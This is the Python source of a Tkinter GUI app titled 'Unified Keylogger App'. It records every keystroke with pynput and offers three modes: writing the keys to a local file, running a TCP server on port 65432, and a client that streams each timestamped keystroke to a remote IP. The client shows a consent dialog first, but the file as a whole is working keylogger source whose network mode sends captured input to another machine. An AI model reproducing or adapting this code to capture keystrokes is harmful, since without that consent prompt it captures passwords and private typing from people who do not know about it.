import socket
import threading
import tkinter as tk
from tkinter import messagebox, ttk
from tkinter.scrolledtext import ScrolledText
from pynput import keyboard
from datetime import datetime

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Unified Keylogger App")
        self.root.geometry("750x550")
        self.root.configure(bg="#2b2b2b")

        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TNotebook", background="#2b2b2b", borderwidth=0)
        style.configure("TNotebook.Tab", background="#444", foreground="#eee", font=('Segoe UI', 11, 'bold'))
        style.map("TNotebook.Tab",
                  background=[("selected", "#666")],
                  foreground=[("selected", "#fff")])

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(expand=True, fill='both')

        self.personal_frame = tk.Frame(self.notebook, bg="#1e1e1e")
        self.notebook.add(self.personal_frame, text="Personal Mode")

        self.personal_log_file = "personal_keylog.txt"
        self.personal_listener = None

        tk.Label(self.personal_frame, text="Local Keylogger", font=("Segoe UI", 18), fg="#a8ffa8", bg="#1e1e1e").pack(pady=10)

        self.personal_text = ScrolledText(self.personal_frame, font=("Consolas", 12), bg="#121212", fg="#a8ffa8", insertbackground="#a8ffa8")
        self.personal_text.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
        self.personal_text.insert(tk.END, "[*] Ready to start local keylogging.\n")
        self.personal_text.configure(state='disabled')

        personal_btn_frame = tk.Frame(self.personal_frame, bg="#1e1e1e")
        personal_btn_frame.pack(pady=5)
        self.personal_start_btn = tk.Button(personal_btn_frame, text="Start Logging", width=15, command=self.start_personal_logging,
                                            bg="#4caf50", fg="white", font=("Segoe UI", 12), bd=0, relief="flat")
        self.personal_start_btn.pack(side=tk.LEFT, padx=10)
        self.personal_stop_btn = tk.Button(personal_btn_frame, text="Stop Logging", width=15, command=self.stop_personal_logging,
                                           bg="#f44336", fg="white", font=("Segoe UI", 12), bd=0, relief="flat", state=tk.DISABLED)
        self.personal_stop_btn.pack(side=tk.LEFT, padx=10)

        self.external_frame = tk.Frame(self.notebook, bg="#1e1e1e")
        self.notebook.add(self.external_frame, text="External Mode (Server)")

        tk.Label(self.external_frame, text="External Mode Server", font=("Segoe UI", 18), fg="#ffa8a8", bg="#1e1e1e").pack(pady=10)

        self.external_text = ScrolledText(self.external_frame, font=("Consolas", 12), bg="#121212", fg="#ffa8a8", insertbackground="#ffa8a8")
        self.external_text.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
        self.external_text.insert(tk.END, "[*] Server not running.\n")
        self.external_text.configure(state='disabled')

        external_btn_frame = tk.Frame(self.external_frame, bg="#1e1e1e")
        external_btn_frame.pack(pady=5)
        self.external_start_btn = tk.Button(external_btn_frame, text="Start Server", width=15, command=self.start_server,
                                            bg="#4caf50", fg="white", font=("Segoe UI", 12), bd=0, relief="flat")
        self.external_start_btn.pack(side=tk.LEFT, padx=10)
        self.external_stop_btn = tk.Button(external_btn_frame, text="Stop Server", width=15, command=self.stop_server,
                                           bg="#f44336", fg="white", font=("Segoe UI", 12), bd=0, relief="flat", state=tk.DISABLED)
        self.external_stop_btn.pack(side=tk.LEFT, padx=10)

        self.server_socket = None
        self.client_conn = None
        self.server_thread = None

        self.client_frame = tk.Frame(self.notebook, bg="#1e1e1e")
        self.notebook.add(self.client_frame, text="Remote Client Mode")

        tk.Label(self.client_frame, text="Remote Keylogger Client", font=("Segoe UI", 18), fg="#8ad8ff", bg="#1e1e1e").pack(pady=10)

        ip_frame = tk.Frame(self.client_frame, bg="#1e1e1e")
        ip_frame.pack(pady=10)
        tk.Label(ip_frame, text="Server IP:", font=("Segoe UI", 14), fg="#ddd", bg="#1e1e1e").pack(side=tk.LEFT, padx=5)
        self.server_ip_entry = tk.Entry(ip_frame, font=("Segoe UI", 14))
        self.server_ip_entry.pack(side=tk.LEFT, padx=5)
        self.server_ip_entry.insert(0, "127.0.0.1")

        self.client_status_label = tk.Label(self.client_frame, text="Status: Not connected", font=("Segoe UI", 14), fg="#ffb74d", bg="#1e1e1e")
        self.client_status_label.pack(pady=10)

        client_btn_frame = tk.Frame(self.client_frame, bg="#1e1e1e")
        client_btn_frame.pack(pady=10)
        self.client_start_btn = tk.Button(client_btn_frame, text="Start Sending", width=15, command=self.start_client,
                                          bg="#4caf50", fg="white", font=("Segoe UI", 12), bd=0, relief="flat")
        self.client_start_btn.pack(side=tk.LEFT, padx=10)
        self.client_stop_btn = tk.Button(client_btn_frame, text="Stop Sending", width=15, command=self.stop_client,
                                         bg="#f44336", fg="white", font=("Segoe UI", 12), bd=0, relief="flat", state=tk.DISABLED)
        self.client_stop_btn.pack(side=tk.LEFT, padx=10)

        self.client_socket = None
        self.client_listener = None
        self.client_running = False

    def start_personal_logging(self):
        if self.personal_listener and self.personal_listener.running:
            return
        self.personal_start_btn.config(state=tk.DISABLED)
        self.personal_stop_btn.config(state=tk.NORMAL)
        self.personal_text.configure(state='normal')
        self.personal_text.insert(tk.END, "[*] Starting local keylogging...\n")
        self.personal_text.configure(state='disabled')
        self.personal_listener = keyboard.Listener(on_press=self.on_personal_press)
        self.personal_listener.start()

    def on_personal_press(self, key):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            msg = f"{timestamp} - Key: {key.char}"
        except AttributeError:
            msg = f"{timestamp} - Special Key: {key}"

        self.log_personal(msg)
        self.append_to_file(self.personal_log_file, msg)

    def log_personal(self, text):
        def append_text():
            self.personal_text.configure(state='normal')
            self.personal_text.insert(tk.END, text + "\n")
            self.personal_text.see(tk.END)
            self.personal_text.configure(state='disabled')
        self.root.after(0, append_text)

    def append_to_file(self, filename, text):
        with open(filename, "a") as f:
            f.write(text + "\n")

    def stop_personal_logging(self):
        if self.personal_listener:
            self.personal_listener.stop()
            self.personal_listener = None
        self.personal_start_btn.config(state=tk.NORMAL)
        self.personal_stop_btn.config(state=tk.DISABLED)
        self.log_personal("[*] Local keylogging stopped by user.")

    def start_server(self):
        if self.server_thread and self.server_thread.is_alive():
            return
        self.external_start_btn.config(state=tk.DISABLED)
        self.external_stop_btn.config(state=tk.NORMAL)
        self.log_external("[*] Starting server...")
        self.server_thread = threading.Thread(target=self.run_server, daemon=True)
        self.server_thread.start()

    def run_server(self):
        HOST = '0.0.0.0'
        PORT = 65432
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                self.server_socket = s
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((HOST, PORT))
                s.listen(1)
                self.log_external(f"[*] Server listening on port {PORT}...")
                self.client_conn, addr = s.accept()
                self.log_external(f"[+] Client connected: {addr}")
                with self.client_conn:
                    while True:
                        data = self.client_conn.recv(1024)
                        if not data:
                            self.log_external("[!] Client disconnected.")
                            break
                        self.log_external(data.decode().strip())
        except Exception as e:
            self.log_external(f"[!] Server error: {e}")
        finally:
            self.external_start_btn.config(state=tk.NORMAL)
            self.external_stop_btn.config(state=tk.DISABLED)

    def log_external(self, text):
        def append_text():
            self.external_text.configure(state='normal')
            self.external_text.insert(tk.END, text + "\n")
            self.external_text.see(tk.END)
            self.external_text.configure(state='disabled')
        self.root.after(0, append_text)

    def stop_server(self):
        try:
            if self.client_conn:
                self.client_conn.close()
            if self.server_socket:
                self.server_socket.close()
        except Exception as e:
            self.log_external(f"[!] Error closing server: {e}")
        self.external_start_btn.config(state=tk.NORMAL)
        self.external_stop_btn.config(state=tk.DISABLED)
        self.log_external("[*] Server stopped by user.")

    def start_client(self):
        ip = self.server_ip_entry.get().strip()
        if not ip:
            messagebox.showerror("Input Error", "Please enter the Server IP address.")
            return
        if not messagebox.askyesno("Consent Required", "Allow this tool to send your keystrokes to the server?"):
            messagebox.showinfo("Consent Denied", "Permission denied by user.")
            return

        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((ip, 65432))
        except Exception as e:
            messagebox.showerror("Connection Error", f"Could not connect to server: {e}")
            self.client_status_label.config(text="Status: Not connected", fg="#ff8a65")
            return

        self.client_running = True
        self.client_listener = keyboard.Listener(on_press=self.on_client_press)
        self.client_listener.start()
        self.client_status_label.config(text=f"Status: Connected to {ip}", fg="#81c784")
        self.client_start_btn.config(state=tk.DISABLED)
        self.client_stop_btn.config(state=tk.NORMAL)

    def on_client_press(self, key):
        if not self.client_running or not self.client_socket:
            return
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            msg = f"{timestamp} - Key: {key.char}"
        except AttributeError:
            msg = f"{timestamp} - Special Key: {key}"
        try:
            self.client_socket.sendall(msg.encode() + b'\n')
        except:
            self.client_status_label.config(text="Status: Connection lost!", fg="#e57373")
            self.stop_client()

    def stop_client(self):
        self.client_running = False
        if self.client_listener:
            self.client_listener.stop()
            self.client_listener = None
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
        self.client_status_label.config(text="Status: Disconnected", fg="#ff8a65")
        self.client_start_btn.config(state=tk.NORMAL)
        self.client_stop_btn.config(state=tk.DISABLED)


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
